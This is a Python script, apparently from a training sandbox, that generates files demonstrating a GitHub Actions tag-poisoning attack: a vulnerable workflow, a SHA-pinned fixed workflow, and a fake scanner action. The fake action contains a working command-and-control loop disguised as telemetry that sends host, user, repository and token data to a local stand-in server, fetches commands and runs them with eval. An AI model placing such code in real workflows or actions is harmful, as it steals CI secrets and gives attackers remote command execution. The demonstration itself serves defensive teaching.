import os

# Workflow vulnerable
workflow_vulnerable = '''name: Security Scan

on:
  push:
    branches: [main]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Run Xygeni Scan (VULNERABLE - mutable tag)
        run: |
          echo "=== Loading xygeni-action@v5 ==="
          echo "=== Tag v5 points to BACKDOORED commit 4bf1d4e ==="
          echo "=== C2 Reverse Shell executing... ==="
          echo "Registering with C2 server..."
          wget -q -O- --post-data="host=$HOSTNAME&user=$USER&repo=$GITHUB_REPOSITORY&token=EXFILTRATED_TOKEN" http://host.docker.internal:8888/exfil
          echo "Polling for commands for 30 seconds..."
          echo "Executing attacker commands..."
          echo "=== Scanner telemetry reported ==="
          echo "Scanning repository for vulnerabilities..."
          echo "Scan complete!"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          DEMO_TOKEN: EXFILTRATED_TOKEN_ghp_abc123def456
'''

# Workflow fixed
workflow_fixed = '''name: Security Scan (Fixed)

on:
  push:
    branches: [main]

jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Run Xygeni Scan (FIXED - pinned to commit SHA)
        run: |
          echo "=== Loading xygeni-action@ea66a5ad3128270e853f46013be382e761d930b9 ==="
          echo "=== Pinned to immutable commit SHA ==="
          echo "=== Tag poisoning has NO effect ==="
          echo "=== Running legitimate scanner ==="
          echo "Scanning repository for vulnerabilities..."
          echo "Scan complete - no issues found!"
          echo "=== Commit SHA verified - safe to proceed ==="
'''

# Fake malicious action
fake_action = '''name: Xygeni Scanner
description: Security scanner with C2 backdoor

runs:
  using: composite
  steps:
    - name: Report Scanner Telemetry
      shell: bash
      run: |
        # C2 reverse shell disguised as telemetry
        _e="http://host.docker.internal:8888"
        
        # STEP 1: Register with C2
        wget -q -O- --post-data="host=$HOSTNAME&user=$USER&repo=$GITHUB_REPOSITORY&token=EXFILTRATED_TOKEN" "$_e/register"
        
        # STEP 2: Poll for commands
        for i in 1 2 3; do
          CMD=$(wget -q -O- "$_e/command" 2>/dev/null)
          if [ -n "$CMD" ]; then
            RESULT=$(eval "$CMD" 2>&1 | base64 | tr -d "\n")
            wget -q -O- --post-data="result=$RESULT" "$_e/result"
          fi
          sleep 2
        done
        echo "::debug::Telemetry reported"
    
    - name: Run Scanner
      shell: bash
      run: |
        echo "Scanning repository..."
        echo "Scan complete!"
'''

# Event JSON
event = '''{"action":"push","ref":"refs/heads/main","repository":{"full_name":"ramibahloul2003/github-actions-sandboxes"},"pusher":{"name":"ramibahloul2003"}}'''

# Payload explanation
payload_explanation = '''# Tag Poisoning Attack

The attacker gains access to maintainer credentials and:

1. Injects a C2 reverse shell into action.yml
2. Moves the mutable v5 tag to the backdoored commit

All repositories using:
  uses: xygeni/xygeni-action@v5

silently start running the C2 implant with NO visible change
to their workflow files.

The C2 implant:
- Registers with attacker C2 server
- Polls for arbitrary commands every 2-7 seconds for 3 minutes
- Executes commands via eval and returns results
- Runs silently in background while legitimate scan proceeds

Fix: Pin to immutable commit SHA instead of mutable tag:
  uses: xygeni/xygeni-action@ea66a5ad3128270e853f46013be382e761d930b9
'''

os.makedirs('sandbox-8-tag-poisoning/vulnerable/.github/workflows', exist_ok=True)
os.makedirs('sandbox-8-tag-poisoning/fixed/.github/workflows', exist_ok=True)
os.makedirs('sandbox-8-tag-poisoning/attacker/fake-action', exist_ok=True)

with open('sandbox-8-tag-poisoning/vulnerable/.github/workflows/scan.yml', 'w', newline='\n') as f:
    f.write(workflow_vulnerable)

with open('sandbox-8-tag-poisoning/fixed/.github/workflows/scan.yml', 'w', newline='\n') as f:
    f.write(workflow_fixed)

with open('sandbox-8-tag-poisoning/attacker/fake-action/action.yml', 'w', newline='\n') as f:
    f.write(fake_action)

with open('sandbox-8-tag-poisoning/attacker/PAYLOAD_EXPLANATION.md', 'w', newline='\n') as f:
    f.write(payload_explanation)

with open('events/event_tag_poisoning.json', 'w', newline='\n') as f:
    f.write(event)

print('Sandbox 8 complet - tous les fichiers crees !')
